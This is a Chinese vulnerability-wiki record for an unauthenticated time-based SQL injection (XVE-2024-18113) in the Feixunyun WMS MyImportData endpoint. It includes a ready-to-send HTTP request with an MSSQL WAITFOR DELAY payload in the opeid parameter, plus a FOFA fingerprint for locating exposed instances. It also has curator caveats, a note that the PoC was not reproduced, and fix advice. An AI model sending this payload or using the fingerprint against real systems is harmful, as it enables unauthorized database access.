---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "飞讯云WMS/供应链平台 MyImportData opeid时间SQL 注入"
product: "飞讯云WMS/供应链平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "XVE-2024-18113"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，MSSQL WAITFOR"
prerequisites: "前台匿名声称"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%A3%9E%E8%AE%AF%E4%BA%91/%E9%A3%9E%E8%AE%AF%E4%BA%91-WMS%20MyDownMyImportData%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28XVE-2024-18113%29.md"
fofa: "body=\"wx8ccb75857bd3e985\""
fofa_unverified: "body="
id: "vw-4abc5cbafefc4ea06985835a"
entity_id: "ve-4abc5cbafefc4ea06985835a"
schema_version: "1"
---

# 飞讯云WMS/供应链平台 MyImportData opeid时间SQL 注入

## 条目说明

- 对象与具体问题：飞讯云WMS/供应链平台；MyImportData opeid时间SQLi
- 版本、配置及部署条件：未知版本，MSSQL WAITFOR
- 认证与权限前提：前台匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- XVE-2024-18113错入cnvd字段，应保留独立命名空间
- 无基线/可读延迟响应，写木马属于条件推论；版本/修复/在野无来源
- HTTP无代码围栏，需统一WMS/供应链产品名

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

飞讯云-WMS /MyDown/MyImportData 接口处存在前台SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

影响范围

飞讯云-WMS

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="wx8ccb75857bd3e985"

POC/EXP：

```http
GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20240725202642131](./.resource/飞讯云-WMSMyDownMyImportData前台SQL注入漏洞XVE-2024-18113/media/image-20240725202642131.png)


![image-20240725202746495](./.resource/飞讯云-WMSMyDownMyImportData前台SQL注入漏洞XVE-2024-18113/media/image-20240725202746495.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
